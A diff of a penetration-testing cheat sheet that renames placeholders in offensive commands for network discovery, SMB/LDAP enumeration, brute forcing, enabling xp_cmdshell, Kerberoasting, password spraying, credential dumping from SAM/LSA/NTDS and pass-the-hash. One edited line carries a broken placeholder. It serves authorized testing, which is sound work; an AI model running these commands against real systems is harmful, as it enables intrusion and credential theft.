@@ -233,13 +233,13 @@ Start with ICMP, then fall back to TCP pings, then ARP if local, then no-ping sc
 
 ```bash
 # ICMP sweep (fast initial discovery)
-nmap -sn <SUBNET>/24 -oA recon_hosts_icmp
+nmap -sn <SUBNET_CIDR> -oA recon_hosts_icmp
 
 # Extract live IPs (grep on gnmap)
 grep "Status: Up" recon_hosts_icmp.gnmap | cut -d " " -f 2 > live_hosts.txt
 
 # Alternative: ping sweep with fping
-fping -a -g <SUBNET>/24 2>/dev/null > live_hosts.txt
+fping -a -g <SUBNET_CIDR> 2>/dev/null > live_hosts.txt
 ```
 
 If ICMP is blocked:
@@ -247,23 +247,23 @@ If ICMP is blocked:
 ```bash
 # TCP SYN ping on common ports across the subnet
 nmap -sn -PS21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3389,5900,8080 \
-  <SUBNET>/24 -oA recon_hosts_tcp
+  <SUBNET_CIDR> -oA recon_hosts_tcp
 
 # TCP ACK ping on common ports (useful for stateful firewalls)
-nmap -sn -PA21,22,80,443 <SUBNET>/24 -oA recon_hosts_tcp_ack
+nmap -sn -PA21,22,80,443 <SUBNET_CIDR> -oA recon_hosts_tcp_ack
 ```
 
 If you are on the same L2 (local network), add ARP discovery:
 
 ```bash
 # ARP discovery with Nmap (fastest for local networks)
-nmap -sn -PR <SUBNET>/24 -oA recon_hosts_arp
+nmap -sn -PR <SUBNET_CIDR> -oA recon_hosts_arp
 
 # ARP discovery of local network with arp-scan
 sudo arp-scan -l
 
 # ARP discovery of specific subnet with arp-scan
-sudo arp-scan <SUBNET>/24
+sudo arp-scan <SUBNET_CIDR>
 ```
 
 If discovery is totally blocked:
@@ -273,26 +273,26 @@ If discovery is totally blocked:
 nmap -Pn <IP> -oA recon_host_10.11.1.5_noping
 
 # Scan entire subnet as up hosts with top 1000 ports
-nmap -Pn -sS --top-ports 1000 <SUBNET>/24 -oA recon_noping_top1000
+nmap -Pn -sS --top-ports 1000 <SUBNET_CIDR> -oA recon_noping_top1000
 ```
 
 NetBIOS discovery (when SMB/NetBIOS suspected):
 
 ```bash
 # NetBIOS scan of subnet with nbtscan
-nbtscan <SUBNET>/24
+nbtscan <SUBNET_CIDR>
 
 # Recursive NetBIOS scan of subnet with nbtscan
-nbtscan -r <SUBNET>/24
+nbtscan -r <SUBNET_CIDR>
 
 # Lookup NetBIOS names for a single host
 nmblookup -A <RHOST>
 
 # SMB discovery across subnet with NetExec (nxc)
-nxc smb <SUBNET>/24
+nxc smb <SUBNET_CIDR>
 
 # SMB discovery across subnet with netexec
-netexec smb <SUBNET>/24
+netexec smb <SUBNET_CIDR>
 ```
 
 ### 1.2 Reachability confirmation
@@ -364,7 +364,7 @@ Note patterns like:
 |`3389`|RDP|`xfreerdp /v:<RHOST>` / `nxc rdp`|
 |`5432`|PostgreSQL|`psql -h <RHOST> -U postgres`|
 |`5900`|VNC|`vncviewer <RHOST>`|
-|`5985`/`5986`|WinRM|`evil-winrm -i <RHOST> -u <USER> -p <PASS>`|
+|`5985`/`5986`|WinRM|`evil-winrm -i <RHOST> -u <USER> -p <PASSWORD>`|
 |`6379`|Redis|`redis-cli -h <RHOST>`|
 |`27017`|MongoDB|`mongo <RHOST>`|
 
@@ -668,7 +668,7 @@ dirsearch -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ -x 403,404 \
 
 # Basic directory fuzzing with extensions and authentication
 dirsearch -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ -x 403,400,404,401 \
-  -r -R 2 --auth=<USER>:<PASS> --auth-type=basic
+  -r -R 2 --auth=<USER>:<PASSWORD> --auth-type=basic
 ```
 
 **Dirb:**
@@ -900,7 +900,7 @@ wpscan --url <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ --enumerate vp,vt,tt,cb,dbe,u,m 
   --plugins-detection aggressive --plugins-version-detection aggressive
 
 # Brute force login
-wpscan --url <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ -U <USERNAME> -P /usr/share/wordlists/rockyou.txt
+wpscan --url <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ -U <USER> -P /usr/share/wordlists/rockyou.txt
 
 # Ignore SSL errors
 wpscan --url https://<RHOST>:<RPORT>/ --disable-tls-checks --enumerate u,t,p
@@ -989,16 +989,16 @@ smbclient //<RHOST>/C$ -N
 
 ```bash
 # Authenticated smbmap enumeration (user/pass)
-smbmap -H <RHOST> -u '<USER>' -p '<PASS>'
+smbmap -H <RHOST> -u '<USER>' -p '<PASSWORD>'
 
 # Authenticated smbmap enumeration with an explicit domain
-smbmap -H <RHOST> -u '<USER>' -p '<PASS>' -d <DOMAIN>
+smbmap -H <RHOST> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>
 
 # Connect to a specific SMB share using user%pass syntax
-smbclient //<RHOST>/<SHARE> -U '<USER>%<PASS>'
+smbclient //<RHOST>/<SHARE> -U '<USER>%<PASSWORD>'
 
 # Recursive smbmap listing, limited to 5 levels deep
-smbmap -H <RHOST> -u '<USER>' -p '<PASS>' -R --depth 5
+smbmap -H <RHOST> -u '<USER>' -p '<PASSWORD>' -R --depth 5
 ```
 
 **Null session attempt:**
@@ -1020,7 +1020,7 @@ rpcclient -U "" <RHOST> -N -c "enumdomgroups"
 
 ```bash
 # Connect to the share (drops into smb: \> prompt)
-smbclient //<RHOST>/<SHARE> -U '<USER>%<PASS>'
+smbclient //<RHOST>/<SHARE> -U '<USER>%<PASSWORD>'
 
 # Enable recursive directory traversal for subsequent commands
 smb: \> recurse ON
@@ -1298,17 +1298,17 @@ ldapsearch -x -h <RHOST> -b "dc=<DOMAIN>,dc=local" "*" | awk '/dn: / {print $2}'
 ```
 ```bash
 # With credentials
-ldapsearch -x -H ldap://<RHOST> -D "<USER>@<DOMAIN>" -w '<PASS>' -b "DC=<DOMAIN>,DC=local" "(objectClass=user)"
+ldapsearch -x -H ldap://<RHOST> -D "<USER>@<DOMAIN>" -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=local" "(objectClass=user)"
 ```
 
 **Using ldapdomaindump:**
 
 ```bash
 # Dump AD LDAP domain objects using creds, target as host (defaults to LDAP)
-ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASS>' <RHOST>
+ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASSWORD>' <RHOST>
 
 # Dump AD LDAP domain objects using creds, target explicitly via LDAP URI
-ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASS>' ldap://<RHOST>
+ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASSWORD>' ldap://<RHOST>
 ```
 
 ### 7.3 Confirm DCs and roles
@@ -1726,7 +1726,7 @@ rpcclient -U "" <RHOST> -N -c "enumdomusers" 2>/dev/null
 rpcclient -U "" <RHOST> -N -c "enumdomgroups" 2>/dev/null
 
 # RPC enumeration with credentials
-rpcclient -U '<USER>%<PASS>' <RHOST> -c "enumdomusers"
+rpcclient -U '<USER>%<PASSWORD>' <RHOST> -c "enumdomusers"
 ```
 
 ---
@@ -1755,22 +1755,22 @@ nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwor
 impacket-mssqlclient <USER>@<RHOST> -windows-auth
 
 # Impacket mssqlclient with credentials
-impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<RHOST>
+impacket-mssqlclient <DOMAIN>/<USER>:<PASSWORD>@<RHOST>
 
 # sqsh MSSQL client
-sqsh -S <RHOST> -U <USER> -P <PASS>
+sqsh -S <RHOST> -U <USER> -P <PASSWORD>
 
 # NetExec MSSQL authentication
-nxc mssql <RHOST> -u <USER> -p <PASS>
+nxc mssql <RHOST> -u <USER> -p <PASSWORD>
 
 # NetExec MSSQL query execution
-nxc mssql <RHOST> -u <USER> -p <PASS> -q "SELECT name FROM master.dbo.sysdatabases"
+nxc mssql <RHOST> -u <USER> -p <PASSWORD> -q "SELECT name FROM master.dbo.sysdatabases"
 
 # NetExec MSSQL enalbe xp_cmdshell
-nxc mssql <RHOST> -u <USER> -p <PASS> -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+nxc mssql <RHOST> -u <USER> -p <PASSWORD> -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
 
 # NetExec MSSQL command execution
-nxc mssql <RHOST> -u <USER> -p <PASS> -x "whoami"
+nxc mssql <RHOST> -u <USER> -p <PASSWORD> -x "whoami"
 ```
 
 ### 15.2 MySQL enumeration
@@ -1825,10 +1825,10 @@ nmap -p 3389 --script rdp-vuln-ms12-020 <RHOST>
 rdesktop <RHOST>
 
 # RDP connection with xfreerdp
-xfreerdp /v:<RHOST> /u:<USER> /p:<PASS>
+xfreerdp /v:<RHOST> /u:<USER> /p:<PASSWORD>
 
 # RDP connection ignoring certificate
-xfreerdp /v:<RHOST> /u:<USER> /p:<PASS> /cert:ignore
+xfreerdp /v:<RHOST> /u:<USER> /p:<PASSWORD> /cert:ignore
 
 # Hydra RDP brute force
 hydra -l <USER> -P /usr/share/wordlists/rockyou.txt rdp://<RHOST>
@@ -1868,11 +1868,11 @@ nxc smb <DC_IP>
 nxc smb <DC_IP> --pass-pol
 
 # LDAP enumeration
-ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local'
+ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN_USER>@<DOMAIN>' -w '<DOMAIN_USER_PWD>' -b 'DC=<DOMAIN>,DC=local'
 
 # Domain SID
-rpcclient -U '<USER>%<PASS>' <DC_IP> -c "lsaquery"
-impacket-lookupsid '<DOMAIN>/<USER>:<PASS>'@<DC_IP>
+rpcclient -U '<DOMAIN_USER>%<DOMAIN_USER_PWD>' <DC_IP> -c "lsaquery"
+impacket-lookupsid '<DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD>'@<DC_IP>
 
 # Find domain controllers
 nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
@@ -1907,20 +1907,20 @@ nltest /domain_trusts
 #### Linux
 ```bash
 # Enumerate users
-nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --users
-nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --rid-brute
-impacket-GetADUsers -all '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
+nxc smb <DC_IP> -u '<DOMAIN_USER>' -p '<DOMAIN_USER_PWD>' --users
+nxc smb <DC_IP> -u '<DOMAIN_USER>' -p '<DOMAIN_USER_PWD>' --rid-brute
+impacket-GetADUsers -all '<DOMAIN>/<DOMAIN_USER>:<PASSWORD>' -dc-ip <DC_IP>
 
 # Enumerate groups
-nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --groups
-rpcclient -U '<USER>%<PASS>' <DC_IP> -c "enumdomgroups"
+nxc smb <DC_IP> -u '<DOMAIN_USER>' -p '<DOMAIN_USER_PWD>' --groups
+rpcclient -U '<DOMAIN_USER>%<PASSWORD>' <DC_IP> -c "enumdomgroups"
 
 # Find privileged users
-ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' '(adminCount=1)' sAMAccountName
+ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN_USER>@<DOMAIN>' -w '<DOMAIN_USER_PWD>' -b 'DC=<DOMAIN>,DC=local' '(adminCount=1)' sAMAccountName
 
 # Enum4linux
 enum4linux -a <DC_IP>
-enum4linux -u '<USER>' -p '<PASS>' -a <DC_IP>
+enum4linux -u '<DOMAIN_USER>' -p '<DOMAIN_USER_PWD>' -a <DC_IP>
 ```
 
 #### Windows
@@ -1959,14 +1959,14 @@ kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<PASSWORD>'
 impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat
 
 # AS-REP roasting (with creds)
-impacket-GetNPUsers '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request
+impacket-GetNPUsers '<DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD>' -dc-ip <DC_IP> -request
 
 # Kerberoasting
-impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request -outputfile kerberoast.txt
+impacket-GetUserSPNs '<DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD>' -dc-ip <DC_IP> -request -outputfile kerberoast.txt
 
 # Get TGT
-impacket-getTGT '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
-export KRB5CCNAME=<USER>.ccache
+impacket-getTGT '<DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD>' -dc-ip <DC_IP>
+export KRB5CCNAME=<DOMAIN_USER>.ccache
 ```
 
 #### Windows
@@ -1997,19 +1997,19 @@ setspn -Q */*
 #### Linux
 ```bash
 # Basic share enum
-nxc smb <RHOST> -u '<USER>' -p '<PASS>' --shares
-nxc smb <NETWORK>/24 -u '<USER>' -p '<PASS>' --shares
+nxc smb <RHOST> -u '<USER>' -p '<PASSWORD>' --shares
+nxc smb <NETWORK>/24 -u '<USER>' -p '<PASSWORD>' --shares
 
 # Spider shares
-nxc smb <RHOST> -u '<USER>' -p '<PASS>' -M spider_plus
+nxc smb <RHOST> -u '<USER>' -p '<PASSWORD>' -M spider_plus
 
 # SMBMap
-smbmap -H <RHOST> -u '<USER>' -p '<PASS>'
-smbmap -H <RHOST> -u '<USER>' -p '<PASS>' -R <SHARE>
+smbmap -H <RHOST> -u '<USER>' -p '<PASSWORD>'
+smbmap -H <RHOST> -u '<USER>' -p '<PASSWORD>' -R <SHARE>
 
 # SMBClient
-smbclient -L //<RHOST> -U '<USER>%<PASS>'
-smbclient //<RHOST>/<SHARE> -U '<USER>%<PASS>'
+smbclient -L //<RHOST> -U '<USER>%<PASSWORD>'
+smbclient //<RHOST>/<SHARE> -U '<USER>%<PASSWORD>'
 ```
 
 #### Windows
@@ -2158,16 +2158,16 @@ In case of issues, follow this guide: https://breachar.medium.com/install-bloodh
 #### Linux - BloodHound Python
 ```bash
 # Standard auth - full collection
-bloodhound-python -c All -u <USER> -p <PASS> -d <DOMAIN> -ns <DNS_IP>
+bloodhound-python -c All -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> -d <DOMAIN> -ns <DC_IP>
 
 # Kerberos auth (requires -k and env var)
-bloodhound-python -c All -u <USER> -p '' -k -d <DOMAIN> -ns <DNS_IP>
+bloodhound-python -c All -u <DOMAIN_USER> -p '' -k -d <DOMAIN> -ns <DC_IP>
 
 # DC only - faster and stealthier
-bloodhound-python -c DCOnly -u <USER> -p <PASS> -d <DOMAIN> -ns <DNS_IP>
+bloodhound-python -c DCOnly -u <DOMAIN_USER> -p <PASSWORD> -d <DOMAIN> -ns <DC_IP>
 
 # Specific collection methods
-bloodhound-python -c Group,LocalAdmin,Session,Trusts -u <USER> -p <PASS> -d <DOMAIN> -ns <DNS_IP>
+bloodhound-python -c Group,LocalAdmin,Session,Trusts -u <DOMAIN_USER> -p <DOMAIN_USER_PWD> -d <DOMAIN> -ns <DC_IP>
 ```
 
 #### Windows - SharpHound
@@ -2220,16 +2220,16 @@ Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirec
 #### Linux
 ```bash
 # Dump SAM/LSA
-nxc smb <RHOST> -u '<USER>' -p '<PASS>' --sam
-nxc smb <RHOST> -u '<USER>' -p '<PASS>' --lsa
+nxc smb <RHOST> -u '<USER>' -p '<PASSWORD>' --sam
+nxc smb <RHOST> -u '<USER>' -p '<PASSWORD>' --lsa
 
 # Dump NTDS (Domain Controller)
-nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --ntds
+nxc smb <DC_IP> -u '<DOMAIN_USER>' -p '<DOMAIN_USER_PWD>' --ntds
 
 # Secretsdump
-impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP>
-impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USER>:<PASS>'@<DC_IP>
-impacket-secretsdump -just-dc-user <USERNAME> '<DOMAIN>/<USER>:<PASS>'@<DC_IP>
+impacket-secretsdump '<DOMAIN>/<DOMAIN_>:<DOMAIN_USER_PWD>'@<DC_IP>
+impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD>'@<DC_IP>
+impacket-secretsdump -just-dc-user <TARGET_DOMAIN_USER> '<DOMAIN>/<DOMAIN_USER>:<DOMAIN_USER_PWD>'@<DC_IP>
 
 # Pass-the-hash
 nxc smb <RHOST> -u '<USER>' -H '<NTLM_HASH>'
